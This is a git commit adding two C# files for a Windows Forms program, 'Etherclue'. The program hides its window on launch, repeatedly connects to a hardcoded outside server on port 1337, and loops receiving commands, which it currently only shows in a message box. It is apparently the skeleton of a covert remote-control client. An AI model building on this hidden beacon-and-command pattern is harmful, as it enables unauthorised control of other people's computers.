b6db858f4dd8851afab701d2f089db82b62e5546
Patrick-van-Halm <pvanhalm00@gmail.com>
2018-06-06 22:48:18 +0200

    Important project files

---
+++ Etherclue/EtherclueMain.cs
@@ -0,0 +1,44 @@
+﻿using System;
+using System.Collections.Generic;
+using System.ComponentModel;
+using System.Data;
+using System.Drawing;
+using System.Linq;
+using System.Text;
+using System.Threading.Tasks;
+using System.Windows.Forms;
+
+namespace Etherclue
+{
+    public partial class EtherclueMain : Form
+    {
+        Encryption encryption = new Encryption();
+        clsSocket socket;
+        public EtherclueMain()
+        {
+            InitializeComponent();
+        }
+
+        private void EtherclueMain_Shown(object sender, EventArgs e)
+        {
+            
+        }
+
+        private void CheckCommand(string cmd)
+        {
+            MessageBox.Show(cmd);
+            socket.Send("Testing");
+        }
+
+        private void EtherclueMain_Load(object sender, EventArgs e)
+        {
+            socket = new clsSocket("moots.me", 1337);
+            this.Hide();
+            socket.Send("Test");
+            while (socket.IsConnected())
+            {
+                CheckCommand(socket.Receive());
+            }
+        }
+    }
+}
---
+++ Etherclue/clsSocket.cs
@@ -0,0 +1,75 @@
+﻿using System;
+using System.Collections.Generic;
+using System.Linq;
+using System.Text;
+using System.Threading.Tasks;
+using System.Net.Sockets;
+using System.Net;
+using System.Threading;
+using System.Windows.Forms;
+
+namespace Etherclue
+{
+    class clsSocket
+    {
+        const string EOL = "\r\n\r\n";
+        private string host;
+        private int port;
+        private Socket socket;
+
+        public clsSocket(string host, int port)
+        {
+            this.host = host;
+            this.port = port;
+            socket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
+            Connect();
+        }
+
+        private IPAddress resolve()
+        {
+            IPAddress address = null;
+            if (IPAddress.TryParse(host, out address))
+            {
+                return address;
+            }
+            else
+            {
+                return Dns.GetHostEntry(host).AddressList[0];
+            }
+        }
+
+        private void Connect()
+        {
+            while (!socket.Connected)
+            {
+                try
+                {
+                    socket.Connect(resolve(), port);
+                }
+                catch (Exception)
+                {
+                    Thread.Sleep(5000);
+                }
+            }
+        }
+
+        public void Send(string msg)
+        {
+            byte[] message = Encoding.Default.GetBytes(msg + EOL);
+            socket.Send(message, message.Length, SocketFlags.None);
+            Thread.Sleep(100);
+        }
+
+        public string Receive()
+        {
+            byte[] buffer = new byte[4096];
+            socket.Receive(buffer, 0, socket.Available, SocketFlags.None);
+            return Encoding.Default.GetString(buffer);
+        }
+
+        public bool IsConnected()
+        {
+            return socket.Connected;
+        }
+    }
+}
